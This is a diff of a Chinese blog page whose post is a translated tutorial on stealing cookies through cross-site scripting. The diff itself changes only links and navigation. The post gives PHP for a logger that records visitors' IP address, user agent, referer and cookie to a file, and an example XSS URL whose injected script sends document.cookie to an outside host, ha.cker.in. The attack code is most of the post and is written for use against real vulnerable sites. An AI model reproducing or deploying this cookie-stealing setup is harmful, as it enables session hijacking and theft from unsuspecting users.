@@ -56,7 +56,7 @@
 </span>
     <h1 class="post-title">利用xss偷cookie 教学</h1>
     <section class="post-content">
-      <p><blockquote> <p> 譯:[hiphop] </p></blockquote> </p><p>使用的工具：  </p><p>1.免费网页支援PHP  </p><p>2.存在xss的脆弱的网站。  </p><p>vb.php为存放cookie的网页  </p><p>PHP Code:<br>&lt;head&gt;<br>&lt;meta http-equiv=”Content-Language” content=”it”&gt;<br>&lt;title&gt;Cookies Stealther - Designed and programmed by R00t[ATI]&lt;/title&gt;<br>&lt;/head&gt;  </p><p>&lt;body bgcolor=”#C0C0C0”&gt;  </p><p>&lt;p align=”center”&gt;&lt;font color=”#FF0000”&gt;COOKIES STEALTHER&lt;/font&gt;&lt;/p&gt;<br>&lt;p align=”center”&gt;&lt;font face=”Arial” color=”#FF0000”&gt;By R00T[ATI]&lt;/font&gt;&lt;/p&gt;<br>&lt;p align=”left”&gt;&amp;nbsp;&lt;/p&gt;  </p><p>&lt;/body&gt;&nbsp; </p><p>documents.php取得cookie的网页<br>PHP Code:<br>&nbsp;&nbsp;&nbsp; &lt;?php  </p><p>$ip = $_SERVER[‘REMOTE_ADDR’];<br>$referer = $_SERVER[‘HTTP_REFERER’];<br>$agent = $_SERVER[‘HTTP_USER_AGENT’];  </p><p>$data = $_GET[c];  </p><p>$time = date(“Y-m-d G:i:s A”);<br>$text = “&lt;br&gt;&lt;br&gt;”.$time.” = “.$ip.”&lt;br&gt;&lt;br&gt;User Agent: “.$agent.”&lt;br&gt;Referer:&nbsp;&nbsp;&nbsp; “.$referer.”&lt;br&gt;Session: “.$data.”&lt;br&gt;&lt;br&gt;&lt;br&gt;”;  </p><p>$file = fopen(‘vb.php’ , ‘a’);<br>fwrite($file,$text);<br>fclose($file);<br>header(“Location: <a href="http://ha.cker.in" target="_blank" rel="external">http://ha.cker.in”);</a> </p><p>?&gt;&nbsp;&nbsp;&nbsp; </p><p>Vb.php文件是用来收集Cookie和其他信息。  </p><p>documents.php文件用于抓取资料如： IP地址，用户代理和cookie 。  </p><p>现在，我们需要找到脆弱网站跨站点脚本（ XSS ） 。在这之后插入一个脚本调用documents.php是抓住文件的Cookie使用的方法<br>documents.php?c=”+document.cookie;<br>如下例子<br>:<br>Code:<br><a href="http://vulnerable-site.com/vulnerable_page.php?vulnerable_method=&lt;script&gt;document.location=&quot;http://ha.cker.in/documents.php?c=&quot;+document.cookie;&lt;/script&amp;gt" target="_blank" rel="external">http://vulnerable-site.com/vulnerable_page.php?vulnerable_method=&lt;script&gt;document.location=&quot;http://ha.cker.in/documents.php?c=&quot;+document.cookie;&lt;/script&amp;gt</a>;  </p><p>当受害者点到这个连结时cookie就被偷走了会存放在vb.php里面</p><p></p>
+      <p><blockquote> <p> 譯:[hiphop] </p></blockquote> </p><p>使用的工具：  </p><p>1.免费网页支援PHP  </p><p>2.存在xss的脆弱的网站。  </p><p>vb.php为存放cookie的网页  </p><p>PHP Code:<br>&lt;head&gt;<br>&lt;meta http-equiv=”Content-Language” content=”it”&gt;<br>&lt;title&gt;Cookies Stealther - Designed and programmed by R00t[ATI]&lt;/title&gt;<br>&lt;/head&gt;  </p><p>&lt;body bgcolor=”#C0C0C0”&gt;  </p><p>&lt;p align=”center”&gt;&lt;font color=”#FF0000”&gt;COOKIES STEALTHER&lt;/font&gt;&lt;/p&gt;<br>&lt;p align=”center”&gt;&lt;font face=”Arial” color=”#FF0000”&gt;By R00T[ATI]&lt;/font&gt;&lt;/p&gt;<br>&lt;p align=”left”&gt;&amp;nbsp;&lt;/p&gt;  </p><p>&lt;/body&gt;&nbsp; </p><p>documents.php取得cookie的网页<br>PHP Code:<br>&nbsp;&nbsp;&nbsp; &lt;?php  </p><p>$ip = $_SERVER[‘REMOTE_ADDR’];<br>$referer = $_SERVER[‘HTTP_REFERER’];<br>$agent = $_SERVER[‘HTTP_USER_AGENT’];  </p><p>$data = $_GET[c];  </p><p>$time = date(“Y-m-d G:i:s A”);<br>$text = “&lt;br&gt;&lt;br&gt;”.$time.” = “.$ip.”&lt;br&gt;&lt;br&gt;User Agent: “.$agent.”&lt;br&gt;Referer:&nbsp;&nbsp;&nbsp; “.$referer.”&lt;br&gt;Session: “.$data.”&lt;br&gt;&lt;br&gt;&lt;br&gt;”;  </p><p>$file = fopen(‘vb.php’ , ‘a’);<br>fwrite($file,$text);<br>fclose($file);<br>header(“Location: <a href="http://ha.cker.in">http://ha.cker.in”);</a> </p><p>?&gt;&nbsp;&nbsp;&nbsp; </p><p>Vb.php文件是用来收集Cookie和其他信息。  </p><p>documents.php文件用于抓取资料如： IP地址，用户代理和cookie 。  </p><p>现在，我们需要找到脆弱网站跨站点脚本（ XSS ） 。在这之后插入一个脚本调用documents.php是抓住文件的Cookie使用的方法<br>documents.php?c=”+document.cookie;<br>如下例子<br>:<br>Code:<br><a href="http://vulnerable-site.com/vulnerable_page.php?vulnerable_method=&lt;script&gt;document.location=&quot;http://ha.cker.in/documents.php?c=&quot;+document.cookie;&lt;/script&amp;gt" target="_blank" rel="external">http://vulnerable-site.com/vulnerable_page.php?vulnerable_method=&lt;script&gt;document.location=&quot;http://ha.cker.in/documents.php?c=&quot;+document.cookie;&lt;/script&amp;gt</a>;  </p><p>当受害者点到这个连结时cookie就被偷走了会存放在vb.php里面</p><p></p>
 
     </section>
     <footer class="post-footer">
@@ -66,18 +66,18 @@
 </section>
       <section class="share">
     <h4>Share this post</h4>
-    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://www.cker.in/79.seo/" target="_blank">
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/79.seo/" target="_blank">
         <span class="hidden">weibo</span>
     </a>
-    <a class="icon-twitter" href="http://twitter.com/share?url=http://www.cker.in/79.seo/"
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/79.seo/"
        onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
         <span class="hidden">Twitter</span>
     </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://www.cker.in/79.seo/"
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/79.seo/"
        onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
         <span class="hidden">Facebook</span>
     </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://www.cker.in/79.seo/"
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/79.seo/"
        onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
         <span class="hidden">Google+</span>
     </a>
@@ -133,15 +133,15 @@
 
           <a class="icon-home"  href="/"><span>Home</span></a>
 
-          <a class="icon-news"  href="/archive"><span>Archive</span></a>
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
 
           <a class="icon-image"  href="/images"><span>Images</span></a>
 
-          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
 
           <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
 
-          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
 
 </nav>
 
